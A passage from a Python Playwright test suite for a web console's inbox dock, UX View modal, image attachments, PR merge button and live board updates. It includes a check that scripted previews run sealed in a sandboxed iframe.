                page.click(".ck-item-btn")
                page.wait_for_selector(".ck-message-text")
                got = {g["text"]: g for g in page.evaluate(self.LINES)}
                self.assertIn(MULTILINE_OWNER, got, list(got))
                self.assertIn(MULTILINE_REPLY, got, list(got))
                self.assertEqual(got[MULTILINE_OWNER]["lines"], 3, got)
                self.assertEqual(got[MULTILINE_REPLY]["lines"], 4, got)   # the blank line is kept too
                # Catches: a fix that turns the text into HTML (<br>) instead of styling it.
                self.assertNotIn("<", got[MULTILINE_REPLY]["html"])

    def test_narrow_window_keeps_the_overlay(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1023)
                s = self._state(page)
                self.assertEqual((s["strip"], s["inboxBtn"], s["bodyMargin"]), (None, True, "0px"), s)
                page.click(".ck-inbox-btn")
                s = self._state(page)
                self.assertEqual((s["modal"], s["backdrop"], s["role"]), ("true", True, "dialog"), s)
                page.keyboard.press("Escape")
                self.assertFalse(self._state(page)["open"])
                page.set_viewport_size({"width": 1024, "height": 800})
                s = self._state(page)
                self.assertEqual((s["strip"], s["inboxBtn"]), ([980, 1024], False), s)

    def test_narrowing_an_open_column_makes_a_proper_modal(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-dock-strip")
                page.click("#board-input")                         # focus out on the board
                page.set_viewport_size({"width": 800, "height": 800})
                s = self._state(page)
                self.assertEqual((s["modal"], s["backdrop"], s["focusInPanel"]), ("true", True, True), s)
                page.set_viewport_size({"width": 1400, "height": 800})
                s = self._state(page)
                self.assertEqual((s["modal"], s["backdrop"], s["panel"]), (None, False, [1400 - DOCK_COL, 1400]), s)


    def test_shift_tab_leaves_an_open_docked_column(self):
        # Docked is not modal: no focus trap, so Shift+Tab from the column's
        # first control steps back onto the page instead of wrapping to its last.
        # (Tested from the start, not the end: the column is last in the DOM, and
        # tabbing off the end of a page goes to browser chrome, where Firefox
        # leaves document.activeElement unchanged.)
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-dock-strip")
                self._state(page)
                page.evaluate("""() => document.querySelector('.ck-panel').querySelector(
                  'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])').focus()""")
                page.keyboard.press("Shift+Tab")
                s = self._state(page)
                self.assertFalse(s["focusInPanel"], s)
                self.assertEqual(s["focus"], "ck-item-btn", s)             # the page's last control
                # And forwards: Tab from the column's last control is not held.
                # Off the end of the page focus goes to browser chrome, which
                # headless Firefox does not report, so watch the key itself: a
                # trap cancels the Tab (preventDefault), a non-modal column must not.
                page.evaluate("() => document.addEventListener('keydown', e => {"
                              " if (e.key === 'Tab') window.__tabHeld = e.defaultPrevented; })")
                page.evaluate(f"() => {{ const f = [...document.querySelector('.ck-panel').querySelectorAll({FOCUSABLE!r})]"
                              ".filter(e => e.getClientRects().length); f[f.length - 1].focus(); }")
                page.keyboard.press("Tab")
                self.assertIs(page.evaluate("window.__tabHeld"), False, f"{kind}: the docked column held Tab")

    def test_overlay_trap_skips_the_hidden_back_button(self):
        # Below 1024px the overlay IS modal: Shift+Tab from its first rendered
        # control wraps to its last, never out to the page behind the backdrop.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 800)
                page.click(".ck-inbox-btn")
                self._state(page)
                page.focus(".ck-panel .ck-close-btn")              # first rendered control
                page.keyboard.press("Shift+Tab")
                self.assertTrue(self._state(page)["focusInPanel"])

    def test_a_closed_column_is_out_of_the_tab_order(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-dock-strip")
                self._state(page)                    # let the open's refresh re-render land
                page.focus(".ck-panel .ck-close-btn")
                page.keyboard.press("Escape")
                s = self._state(page)
                self.assertEqual((s["open"], s["inert"]), (False, True), s)
                page.focus("#board-input")
                self.assertEqual(self._tab_path(page, 6), [False] * 6)

    def test_a_slow_refresh_never_pulls_focus_off_the_board(self):
        # Opening fetches /view again; when it lands late, a docked column must
        # not take focus back from the board the owner has moved on to.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                _Handler.view_delay = 1.0
                page.click(".ck-dock-strip")
                page.wait_for_timeout(150)
                page.click("#board-input")
                page.wait_for_timeout(1600)                        # the refresh has landed
                self.assertEqual(self._state(page)["focus"], "board-input")
                _Handler.view_delay = 0.0

    def test_badge_says_unknown_until_the_view_loads(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.view_fails = True
                page = self._page(kind, 1400, loaded=False)
                page.wait_for_timeout(500)
                # 1.24.0: the pre-load "?" became a muted, decorative inbox glyph; never "0", which would
                # read as "nothing waiting". The label, not the glyph, says the count is unknown.
                self.assertEqual(page.text_content(".ck-dock-strip .ck-inbox-count"), "✉")
                self.assertEqual(page.get_attribute(".ck-dock-strip .ck-inbox-glyph", "aria-hidden"), "true")
                self.assertEqual(page.get_attribute(".ck-dock-strip", "data-loaded"), "false")
                self.assertEqual(page.get_attribute(".ck-dock-strip", "aria-label"), "Open inbox (loading)")
                self.assertEqual(page.get_attribute(".ck-dock-strip", "aria-controls"), "ck-panel")
                _Handler.view_fails = False

    # Catches: threads waiting on the agent summed into the owner's badge (it would
    # read 3, and "waiting" would include work that is not the owner's), or never
    # shown at all. Checked on both presentations: the strip and the button.
    # The state mark (D8, after 1.31): an inline icon, decorative (the label carries the words), in place of
    # the text glyph "●" these counts and chips were read with before.
    AGENT = """sel => { const b = document.querySelector(sel), a = b.querySelector('.ck-agent-count');
      const m = a.querySelector('.ck-mark');
      return { owner: b.querySelector('.ck-inbox-count').textContent, agent: a.textContent,
               mark: m && [m.getAttribute('data-state'), !!m.querySelector('svg.ck-icon'), m.getAttribute('aria-hidden')],
               agentShown: getComputedStyle(a).display !== 'none', label: b.getAttribute('aria-label') }; }"""

    def test_threads_waiting_on_the_agent_get_their_own_count(self):
        for kind in BROWSERS:
            for width, sel in ((1400, ".ck-dock-strip"), (800, ".ck-inbox-btn")):
                with self.subTest(browser=kind, width=width):
                    _Handler.view_agent = True
                    page = self._page(kind, width)
                    got = page.evaluate(self.AGENT, sel)
                    self.assertEqual(got["owner"], "2")
                    self.assertEqual(got["agent"], " 1")
                    self.assertEqual(got["mark"], ["awaiting_agent", True, "true"], got)
                    self.assertTrue(got["agentShown"])
                    self.assertEqual(got["label"], "Open inbox, 2 waiting for you, 1 waiting on an agent")

    # The inbox's "with the agent" row, as the owner reads it.
    AGENT_ROW = """() => { const s = document.querySelector('.ck-inbox-list .ck-q-state[data-state="agent_active"], .ck-inbox-list .ck-q-state[data-state="awaiting_agent"]');
      const hs = Array.from(document.querySelectorAll('.ck-section-heading')).map(h => h.textContent);
      const m = s && s.querySelector('.ck-mark');
      return { chip: s && s.textContent, state: s && s.getAttribute('data-state'), headings: hs,
               mark: m && [m.getAttribute('data-state'), !!m.querySelector('svg.ck-icon'), m.getAttribute('aria-hidden')] }; }"""

    def test_an_item_an_agent_is_working_on_reads_agent_active(self):
        # Owner, 2026-09-29: "when an agent is working on something, relabel 'awaiting agent' to 'agent active'".
        # Catches: the relabel applied to every agent thread (it would claim work nobody picked up),
        # never applied, or applied whenever ANY item is marked (a mark on OTHER.9 must leave
        # LANE.1 reading "awaiting agent"; review of PR #180). Every state, both presentations.
        for kind in BROWSERS:
            for marked, words, heading in (("LANE.1", "agent active", "Agent active"),
                                           (False, "awaiting agent", "Awaiting agent"),
                                           ("OTHER.9", "awaiting agent", "Awaiting agent")):
                working = marked == "LANE.1"
                for width, sel in ((1400, ".ck-dock-strip"), (800, ".ck-inbox-btn")):
                    with self.subTest(browser=kind, marked=marked, width=width):
                        _Handler.view_agent, _Handler.view_working = True, marked
                        page = self._page(kind, width)
                        label = page.evaluate(self.AGENT, sel)["label"]
                        want = "1 with an agent at work" if working else "1 waiting on an agent"
                        self.assertEqual(label, "Open inbox, 2 waiting for you, " + want)
                        page.click(sel)
                        page.wait_for_selector(".ck-inbox-list .ck-q-state[data-state='agent_active'], .ck-inbox-list .ck-q-state[data-state='awaiting_agent']")
                        got = page.evaluate(self.AGENT_ROW)
                        self.assertEqual(got["chip"], " " + words, got)
                        self.assertEqual(got["mark"], ["awaiting_agent", True, "true"], got)   # one bot mark either way
                        self.assertEqual(got["state"], "agent_active" if working else "awaiting_agent", got)
                        self.assertIn(heading, got["headings"], got)

    AGENT_CHIPS = """() => Array.from(document.querySelectorAll(
        '.ck-inbox-list .ck-q-state[data-state="agent_active"], .ck-inbox-list .ck-q-state[data-state="awaiting_agent"]'))
        .map(s => s.getAttribute('data-state')).sort()"""

    def test_two_agent_threads_one_in_hand(self):
        # Review of PR #180: with one agent thread the mark and the thread coincide, so a label
        # that ignores WHICH item is marked still passes. Two threads, LANE.1 marked: one chip
        # each way, the heading stays "Awaiting agent" (not every row is in hand), both counts named.
        for kind in BROWSERS:
            for width, sel in ((1400, ".ck-dock-strip"), (800, ".ck-inbox-btn")):
                with self.subTest(browser=kind, width=width):
                    _Handler.view_agent, _Handler.view_working = 2, "LANE.1"
                    page = self._page(kind, width)
                    label = page.evaluate(self.AGENT, sel)["label"]
                    self.assertEqual(label, "Open inbox, 2 waiting for you, 1 waiting on an agent, "
                                            "1 with an agent at work")
                    page.click(sel)
                    page.wait_for_selector(".ck-inbox-list .ck-q-state[data-state='agent_active']")
                    self.assertEqual(page.evaluate(self.AGENT_CHIPS), ["agent_active", "awaiting_agent"])
                    heads = page.evaluate(self.AGENT_ROW)["headings"]
                    self.assertIn("Awaiting agent", heads)
                    self.assertNotIn("Agent active", heads)

    # Owner, 2026-09-29: "after hitting 'all answers' there is no way to get back to 'inbox'".
    TOGGLE = """() => { const b = document.querySelector('.ck-sheet-toggle'), t = document.querySelector('.ck-title');
      const back = document.querySelector('.ck-back-btn');
      return { text: b && b.textContent, pressed: b && b.getAttribute('aria-pressed'), title: t && t.textContent,
               backShown: !!back && getComputedStyle(back).display !== 'none', backLabel: back && back.getAttribute('aria-label') }; }"""

    def test_all_answers_is_a_toggle_back_to_the_inbox(self):
        # Catches: a sheet with no way back on a desktop (the reported bug), a toggle that goes
        # somewhere other than the inbox, or a header Back that is hidden or leads elsewhere. 0.9.0
        # stopped hiding the header's Back at desktop widths, so the toggle is no longer the only
        # way back: both lead to the inbox, at every width.
        for kind in BROWSERS:
            for width, opener in ((1400, ".ck-dock-strip"), (800, ".ck-inbox-btn")):
                with self.subTest(browser=kind, width=width):
                    page = self._page(kind, width)
                    page.click(opener)
                    page.wait_for_selector(".ck-sheet-toggle")
                    got = page.evaluate(self.TOGGLE)
                    self.assertEqual((got["text"], got["pressed"], got["title"]), ("All answers", "false", "Inbox"), got)
                    page.click(".ck-sheet-toggle")
                    _wait_for(page, "document.querySelector('.ck-title').textContent.startsWith('Answers')")
                    got = page.evaluate(self.TOGGLE)
                    self.assertEqual((got["text"], got["pressed"]), ("Inbox", "true"), got)
                    self.assertEqual((got["backShown"], got["backLabel"]), (True, "Back to inbox"), got)
                    page.click(".ck-sheet-toggle")
                    _wait_for(page, "document.querySelector('.ck-title').textContent === 'Inbox'")
                    got = page.evaluate(self.TOGGLE)
                    self.assertEqual((got["text"], got["pressed"]), ("All answers", "false"), got)
                    focused = page.evaluate("document.activeElement === document.querySelector('.ck-title')")
                    self.assertTrue(focused, "focus lands on the inbox title, not on a removed button")

    def test_no_agent_count_when_nothing_waits_on_the_agent(self):
        for kind in BROWSERS:
            for width, sel in ((1400, ".ck-dock-strip"), (800, ".ck-inbox-btn")):
                with self.subTest(browser=kind, width=width):
                    page = self._page(kind, width)
                    got = page.evaluate(self.AGENT, sel)
                    self.assertEqual((got["owner"], got["agent"], got["agentShown"]), ("2", "", False))
                    self.assertEqual(got["label"], "Open inbox, 2 waiting for you")

    LISTENING = """() => { const s = document.querySelector('.ck-status-bar .ck-listening');
      const g = s && s.querySelector('.ck-listening-glyph');
      return s && { text: s.textContent, state: s.getAttribute('data-state'), title: s.title,
                    anim: getComputedStyle(g).animationName }; }"""

    def test_agent_listening_is_said_in_words(self):
        # 0.6.0. Catches: a state shown by colour alone (the words must differ per state), an
        # old server with no `listening` read as listening, and the pulse ignoring reduced motion.
        cases = (({"state": "listening", "last_seen": "2026-09-29T10:00:00Z"}, "listening", "● Agent listening"),
                 ({"state": "idle", "last_seen": "2020-01-02T03:04:05Z"}, "idle", "○ Agent idle since "),
                 ({"state": "never", "last_seen": None}, "never", "○ No agent has listened yet"),
                 (None, "unknown", "? Agent: not known"))
        for kind in BROWSERS:
            for listening, state, words in cases:
                with self.subTest(browser=kind, state=state):
                    _Handler.view_listening = listening
                    page = self._page(kind, 1400)
                    page.click(".ck-dock-strip")
                    page.wait_for_selector(".ck-status-bar .ck-listening")
                    _wait_for(page, "document.querySelector('.ck-listening').getAttribute('data-state') === %r"
                                           % state)
                    got = page.evaluate(self.LISTENING)
                    self.assertTrue(got["text"].startswith(words), got)
                    self.assertTrue(got["title"], got)
                    if state == "idle":
                        self.assertIn("2020", got["text"], "an older day shows its date")
                    self.assertEqual(got["anim"] != "none", state == "listening", got)
            with self.subTest(browser=kind, reduced_motion=True):
                _Handler.view_listening = cases[0][0]
                page = self._page(kind, 1400)
                page.emulate_media(reduced_motion="reduce")
                page.click(".ck-dock-strip")
                _wait_for(page, "(document.querySelector('.ck-listening') || {}).getAttribute && "
                                       "document.querySelector('.ck-listening').getAttribute('data-state') === 'listening'")
                self.assertEqual(page.evaluate(self.LISTENING)["anim"], "none")


LIVE_MARKS = "[data-live],[data-live-title],[data-live-width],[data-live-status]"
# Every live-marked element as the browser now shows it: key, text, title, width, status class.
SIGNATURE = """() => Array.from(document.querySelectorAll('%s')).map(e => [
  e.getAttribute('data-live') || e.getAttribute('data-live-title') ||
    e.getAttribute('data-live-width') || e.getAttribute('data-live-status'),
  e.textContent, e.title, e.style.width,
  Array.from(e.classList).filter(c => c.startsWith('s-')).join(' ')])""" % LIVE_MARKS
COUNT_UPDATES = """window.__boardChanged = 0;
document.addEventListener('ck:board-updated', e => { window.__boardChanged += e.detail.changed; });"""


class UxViewTests(unittest.TestCase):
    """UX View (1.33): the modal over an item's HTML visuals, against the stub server."""

    @classmethod
    def setUpClass(cls):
        DockTests.setUpClass.__func__(cls)

    @classmethod
    def tearDownClass(cls):
        DockTests.tearDownClass.__func__(cls)

    setUp = DockTests.setUp
    _page = DockTests._page

    def _open(self, width=1280):
        _Handler.view_ux = True
        page = self._page("chromium", width)
        page.keyboard.press("Escape")
        page.evaluate("document.querySelector('.ck-dock-strip').click()")
        page.wait_for_selector(".ck-panel[data-open=true]")
        page.evaluate("window.location.hash = 'item=LANE.1'")
        page.wait_for_selector("text=UX View")
        page.get_by_role("button", name="Open UX View for LANE.1").click()
        page.wait_for_selector("#ck-ux-view")
        return page

    def test_ux_item_gets_the_modal_with_versions_sizes_and_a_sandboxed_preview(self):
        page = self._open()
        self.assertEqual(page.locator("#ck-ux-view[role=dialog][aria-modal=true]").count(), 1)
        self.assertIn("v2 of 2", page.locator(".ck-ux-vlabel").inner_text())
        self.assertEqual(page.locator(".ck-ux-frame").get_attribute("sandbox"), "")
        self.assertIn("not saved", page.locator(".ck-ux-status").inner_text())
        page.get_by_role("button", name="Previous version").click()
        self.assertIn("v1 of 2", page.locator(".ck-ux-vlabel").inner_text())
        page.get_by_role("radio", name="Mobile").click()
        self.assertIn("375px", page.locator(".ck-ux-scale").inner_text())
        self.assertTrue(page.evaluate("document.querySelector('.ck-panel').inert"))
        page.keyboard.press("Escape")
        self.assertEqual(page.locator("#ck-ux-view").count(), 0)

    def test_save_and_generate_send_the_owner_messages_step_one_defined(self):
        page = self._open()
        page.get_by_role("button", name="Save as component").click()
        page.wait_for_timeout(300)
        save = [m for m in _Handler.posts if m.get("intent") == "ux-save"]
        self.assertEqual([(m["item"], m["visual_id"]) for m in save], [("LANE.1", "v2")])
        page.get_by_role("button", name="Generate", exact=True).click()
        page.wait_for_timeout(300)
        gen = [m for m in _Handler.posts if m.get("intent") == "visual"]
        self.assertEqual([(m["item"], m["purpose"]) for m in gen], [("LANE.1", "ux")])
        self.assertNotIn("from", gen[0])

    def test_generate_from_design_is_disabled_until_a_link_is_set(self):
        page = self._open()
        page.get_by_role("button", name="More ways to generate").click()
        self.assertTrue(page.get_by_role("menuitem", name="Generate from design").is_disabled())
        page.keyboard.press("Escape")
        page.locator(".ck-ux-settings summary").click()
        page.fill("#ck-ux-link", "https://claude.ai/design/p/fee63c71-69b8-455c-bb5b-c7935342adc1")
        page.get_by_role("button", name="Link design").click()
        page.wait_for_timeout(300)
        link = [m for m in _Handler.posts if m.get("intent") == "ux-link"]
        self.assertEqual([m["url"] for m in link], ["https://claude.ai/design/p/fee63c71-69b8-455c-bb5b-c7935342adc1"])

    def test_a_scripted_component_runs_sealed_and_reaches_nothing(self):
        _Handler.view_scripts = True
        page = self._open()
        frame_el = page.locator(".ck-ux-frame")
        self.assertEqual(frame_el.get_attribute("sandbox"), "allow-scripts")
        self.assertIn("component-render", frame_el.get_attribute("src"))
        self.assertTrue(page.locator(".ck-ux-scripts-badge").is_visible())
        frame = next(f for f in page.frames if "component-render" in f.url)
        frame.wait_for_function("document.getElementById('out').textContent !== 'pending'")
        got = json.loads(frame.evaluate("document.getElementById('out').textContent"))
        self.assertEqual(got, {"parent": "blocked", "storage": "blocked", "cookie": "blocked",
                               "top": "blocked", "fetch": "blocked"})
        page.wait_for_timeout(300)
        # The console ignored the frame's message (it is not one of the console's own chart frames).
        self.assertNotIn("pwned", page.evaluate("document.body.innerText"))
        self.assertEqual(page.evaluate("document.querySelectorAll('a[download]').length"), 0)

    def test_a_viewer_on_the_newest_version_follows_a_new_one_but_not_from_an_older_one(self):
        page = self._open()
        self.assertIn("v2 of 2", page.locator(".ck-ux-vlabel").inner_text())
        _Handler.view_ux = 3                                    # a third version arrives on the next refresh
        page.evaluate("document.querySelector('.ck-refresh-btn').click()")
        page.wait_for_function("document.querySelector('.ck-ux-vlabel').textContent.includes('v3 of 3')")
        page.get_by_role("button", name="Previous version").click()
        self.assertIn("v2 of 3", page.locator(".ck-ux-vlabel").inner_text())
        _Handler.view_ux = 4
        page.evaluate("document.querySelector('.ck-refresh-btn').click()")
        page.wait_for_function("document.querySelector('.ck-ux-vlabel').textContent.includes('of 4')")
        self.assertIn("v2 of 4", page.locator(".ck-ux-vlabel").inner_text())

    PNG = __import__("base64").b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")

    def _item(self):
        _Handler.view_ux = True
        page = self._page("chromium", 1280)
        page.keyboard.press("Escape")
        page.evaluate("document.querySelector('.ck-dock-strip').click()")
        page.wait_for_selector(".ck-panel[data-open=true]")
        page.evaluate("window.location.hash = 'item=LANE.1'")
        page.wait_for_selector(".ck-thread .ck-textarea")
        return page

    def test_the_owner_can_attach_an_image_by_choosing_a_file(self):
        import base64
        page = self._item()
        page.set_input_files(".ck-attach-row input[type=file]", files=[{"name": "my mock.png", "mimeType": "image/png",
                                                                          "buffer": self.PNG}])
        page.wait_for_function("document.querySelector('.ck-attach-status') === null || document.querySelector('.ck-attach-status').textContent !== ''")
        page.wait_for_timeout(400)
        up = [m for m in _Handler.posts if "content_b64" in m]
        self.assertEqual([(m["item"], m["caption"]) for m in up], [("LANE.1", "my mock")])
        self.assertEqual(base64.b64decode(up[0]["content_b64"]), self.PNG)
        self.assertNotIn("kind", up[0])

    def test_pasting_an_image_attaches_it_and_a_non_image_is_refused_before_sending(self):
        page = self._item()
        page.evaluate("""(b64) => {
          const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
          const dt = new DataTransfer();
          dt.items.add(new File([bin], 'pasted.png', {type: 'image/png'}));
          document.querySelector('.ck-thread .ck-textarea').dispatchEvent(new ClipboardEvent('paste', {clipboardData: dt, bubbles: true, cancelable: true}));
        }""", __import__("base64").b64encode(self.PNG).decode())
        page.wait_for_timeout(500)
        self.assertEqual(len([m for m in _Handler.posts if "content_b64" in m]), 1)
        page.set_input_files(".ck-attach-row input[type=file]", files=[{"name": "x.txt", "mimeType": "text/plain", "buffer": b"hi"}])
        page.wait_for_timeout(300)
        self.assertEqual(len([m for m in _Handler.posts if "content_b64" in m]), 1)

    def test_the_owner_picks_design_artifacts_and_generate_sends_them(self):
        _Handler.view_designs = True
        page = self._open()
        page.locator(".ck-ux-settings summary").click()
        self.assertIn("12 listed", page.locator(".ck-ux-refs").inner_text())
        page.fill("[aria-label='Filter design artifacts']", "Button 1")          # Button 1, 10 and 11
        self.assertEqual(page.locator(".ck-ux-ref").count(), 3)
        page.fill("[aria-label='Filter design artifacts']", "")
        page.locator(".ck-ux-ref input[type=checkbox]").nth(0).check()
        page.locator(".ck-ux-ref input[type=checkbox]").nth(1).check()
        page.locator(".ck-ux-refmode").nth(1).select_option("swap")
        self.assertIn("2 of 10 picked", page.locator(".ck-ux-refs").inner_text())
        self.assertIn("The next Generate uses 2 design artifacts", page.locator(".ck-ux-refs-line").inner_text())
        page.get_by_role("button", name="Generate", exact=True).click()
        page.wait_for_timeout(400)
        gen = [m for m in _Handler.posts if m.get("intent") == "visual"]
        self.assertEqual(gen[0]["refs"], [{"path": "buttons/b0.html", "mode": "inspire"}, {"path": "buttons/b1.html", "mode": "swap"}])

    def test_no_more_than_ten_artifacts_can_be_picked(self):
        _Handler.view_designs = True
        page = self._open()
        page.locator(".ck-ux-settings summary").click()
        boxes = page.locator(".ck-ux-ref input[type=checkbox]")
        for i in range(12):
            boxes.nth(i).check() if i < 10 else boxes.nth(i).evaluate("e => { e.checked = true; e.dispatchEvent(new Event('change')); }")
        self.assertIn("10 of 10 picked", page.locator(".ck-ux-refs").inner_text())
        self.assertFalse(boxes.nth(11).is_checked())

    def test_without_a_design_link_the_picker_says_so(self):
        page = self._open()
        page.locator(".ck-ux-settings summary").click()
        self.assertIn("Link a Claude Design project", page.locator(".ck-ux-refs").inner_text())

    def test_a_link_being_typed_survives_a_live_refresh(self):
        page = self._open()
        page.locator(".ck-ux-settings summary").click()
        page.fill("#ck-ux-link", "https://claude.ai/design/p/fee63c71-69b8")
        page.evaluate("document.querySelector('.ck-refresh-btn').click()")      # the view is fetched and repainted
        page.wait_for_timeout(600)
        self.assertEqual(page.input_value("#ck-ux-link"), "https://claude.ai/design/p/fee63c71-69b8")

    def test_full_screen_and_no_overflow_on_a_phone(self):
        page = self._open(width=375)
        box = page.locator(".ck-ux-box").bounding_box()
        self.assertEqual(round(box["width"]), 375)
        self.assertFalse(page.evaluate("document.documentElement.scrollWidth > innerWidth"))


class PrMergeButtonTests(unittest.TestCase):
    """Merge from the PR tab (1.33): shown only on a ready, passing PR; confirmed inline; sends a pr-merge."""

    @classmethod
    def setUpClass(cls):
        DockTests.setUpClass.__func__(cls)

    @classmethod
    def tearDownClass(cls):
        DockTests.tearDownClass.__func__(cls)

    setUp = DockTests.setUp
    _page = DockTests._page

    def _prs(self):
        page = self._page("chromium", 1280)
        page.keyboard.press("Escape")
        page.evaluate("document.querySelector('.ck-dock-strip').click()")
        page.wait_for_selector(".ck-panel[data-open=true]")
        page.locator("#ck-tab-prs").click()
        page.wait_for_selector(".ck-pr-row")
        return page

    def test_only_a_ready_passing_pr_with_a_known_head_gets_the_button(self):
        page = self._prs()
        row = lambda n: page.locator(f".ck-pr-row[data-number='{n}']")
        self.assertEqual(row(5).get_by_role("button", name="Merge pull request 5 into main").count(), 1)
        self.assertIn("Merge when checks pass", row(6).inner_text())
        self.assertEqual(row(6).get_by_role("button").filter(has_text="Merge").count(), 0)
        self.assertEqual(row(8).get_by_role("button").filter(has_text="Merge").count(), 0)
        self.assertIn("prs-push", row(9).inner_text())

    def test_it_confirms_inline_then_sends_the_request_naming_the_commit(self):
        page = self._prs()
        page.get_by_role("button", name="Merge pull request 5 into main").click()
        self.assertIn("Merge #5 into main?", page.locator(".ck-pr-merge-confirm").inner_text())
        page.get_by_role("button", name="Cancel").click()
        self.assertEqual(page.locator(".ck-pr-merge-confirm").count(), 0)
        self.assertEqual(_Handler.posts, [])
        page.get_by_role("button", name="Merge pull request 5 into main").click()
        page.locator(".ck-pr-merge-confirm").get_by_role("button", name="Merge", exact=True).click()
        page.wait_for_timeout(400)
        self.assertEqual([(m["item"], m["intent"], m["pr"], m["expected_head_sha"], m["base"]) for m in _Handler.posts],
                         [("@prs", "pr-merge", 5, "a" * 40, "main")])


class LiveBoardTests(unittest.TestCase):
    """AB-2/Q4 in a real browser: the committed page, caught up from /api/board."""

    # The same server and Playwright as DockTests, without inheriting its tests.
    @classmethod
    def setUpClass(cls):
        if D is None:
            raise unittest.SkipTest(f"no lane board at {BOARD_DIR} (set OVERTURE_BOARD_DIR)")
        DockTests.__dict__["setUpClass"].__func__(cls)

    tearDownClass = DockTests.__dict__["tearDownClass"]

    def setUp(self):
        _Handler.view_delay, _Handler.view_fails, _Handler.view_agent, _Handler.view_working = 0.0, False, False, False
        _Handler.view_listening = None
        _Handler.board, _Handler.board_status, _Handler.board_hits = None, 200, 0

    def _board_page(self, kind, path, board, width=1280):
        _Handler.board = board
        browser = getattr(self.pw, kind).launch()
        self.addCleanup(browser.close)
        page = browser.new_page(viewport={"width": width, "height": 800})
        errors: list[str] = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], f"{kind}: page errors"))
        page.add_init_script(COUNT_UPDATES)
        page.goto(self.url.rstrip("/") + path)
        return page

    def _settle(self, page, hits):
        # Wait until the board has been fetched `hits` times and applied (fetch is async).
        for _ in range(100):
            if _Handler.board_hits >= hits:
                break
            page.wait_for_timeout(50)
        page.wait_for_timeout(300)

    def test_a_status_change_patches_the_page_into_the_new_page(self):
        self.assertEqual(BOARD_A["shape"], BOARD_B["shape"])
        self.assertNotEqual(BOARD_A["values"], BOARD_B["values"])
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                want = self._board_page(kind, "/board-b", BOARD_B).evaluate(SIGNATURE)
                page = self._board_page(kind, "/board-a", BOARD_A)
                self._settle(page, 1)
                before = page.evaluate(SIGNATURE)
                self.assertNotEqual(before, want)  # the change is there to be made
                _Handler.board = BOARD_B
                page.evaluate("window.ConsoleKit.refreshBoard()")
                _wait_for(page, "window.__boardChanged > 0")
                self.assertEqual(page.evaluate(SIGNATURE), want)

    def test_an_unchanged_board_touches_nothing(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._board_page(kind, "/board-a", BOARD_A)
                before = page.evaluate(SIGNATURE)
                self._settle(page, 1)
                self.assertGreaterEqual(_Handler.board_hits, 1)  # it did ask
                self.assertEqual(page.evaluate("window.__boardChanged"), 0)
                self.assertEqual(page.evaluate(SIGNATURE), before)

    def test_a_different_shape_says_what_fixes_it_and_stops(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.board_hits = 0
                other = {"shape": "0" * 16, "values": dict(BOARD_B["values"])}
                page = self._board_page(kind, "/board-a", other)
                page.wait_for_selector(".ck-board-stale", timeout=5000)
                self.assertEqual(page.evaluate("window.__boardChanged"), 0)  # nothing patched
                # A published snapshot reloads as itself, so no Reload; nothing staged here, so the steward.
                self.assertNotIn("Reload", page.inner_text(".ck-board-stale"))
                self.assertIn("agent.py page-snapshot", page.inner_text(".ck-board-stale"))
                hits = _Handler.board_hits
                page.evaluate("window.ConsoleKit.refreshBoard()")
                page.wait_for_timeout(300)
                self.assertEqual(_Handler.board_hits, hits)  # polling stopped

    # Catches: a stale bar that exists but cannot be seen. Polling stops when it
    # appears, so a covered bar is a stale board with no sign of it. The real
    # lane board has a sticky header at top: 0, z-index 100, which covered a
    # sticky bar once the page scrolled (PR #177 review). Checked scrolled, at
    # the overlay width and at both docked states, by what the browser would
    # actually hit at the bar's message (it carries no button with nothing staged).
    HIT = """() => { const b = document.querySelector('.ck-board-stale span'), r = b.getBoundingClientRect();
      const x = r.left + r.width / 2, y = r.top + r.height / 2;
      const bar = document.querySelector('.ck-board-stale'), s = bar.getBoundingClientRect(), my = s.top + s.height / 2;
      const ends = [s.left + 4, s.right - 4].map(px => bar.contains(document.elementFromPoint(px, my)));
      return { inView: r.top >= 0 && r.bottom <= innerHeight && r.left >= 0 && r.right <= innerWidth,
               hit: b.contains(document.elementFromPoint(x, y)), barEnds: ends, scrolled: scrollY }; }"""

    def test_the_stale_bar_is_visible_on_a_scrolled_board(self):
        other = {"shape": "0" * 16, "values": dict(BOARD_B["values"])}
        for kind in BROWSERS:
            for width, dock_open in ((800, False), (1400, False), (1400, True)):
                with self.subTest(browser=kind, width=width, dock_open=dock_open):
                    page = self._board_page(kind, "/board-a", other, width)
                    page.wait_for_selector(".ck-board-stale", timeout=5000)
                    if dock_open:
                        page.click(".ck-dock-strip")
                        _wait_for(page, "document.documentElement.classList.contains('ck-dock-open')")
                    # The lane board sets `scroll-behavior: smooth`, so a plain scrollTo animates:
                    # jump instead, then wait for the scroll itself, never a fixed time (PR #177 review).
                    page.evaluate("window.scrollTo({top: 2500, behavior: 'instant'})")
                    _wait_for(page, "scrollY > 1000", timeout=5000)
                    page.wait_for_timeout(250)  # the docked column's margin transition
                    got = page.evaluate(self.HIT)
                    self.assertGreater(got["scrolled"], 1000)  # the page really scrolled
                    self.assertTrue(got["inView"], got)
                    self.assertTrue(got["hit"], got)
                    self.assertEqual(got["barEnds"], [True, True], got)  # no end tucked under the strip or column

    def test_no_board_route_stops_polling(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.board_hits = 0
                page = self._board_page(kind, "/board-a", None)
                self._settle(page, 1)
                hits = _Handler.board_hits
                page.evaluate("window.ConsoleKit.refreshBoard()")
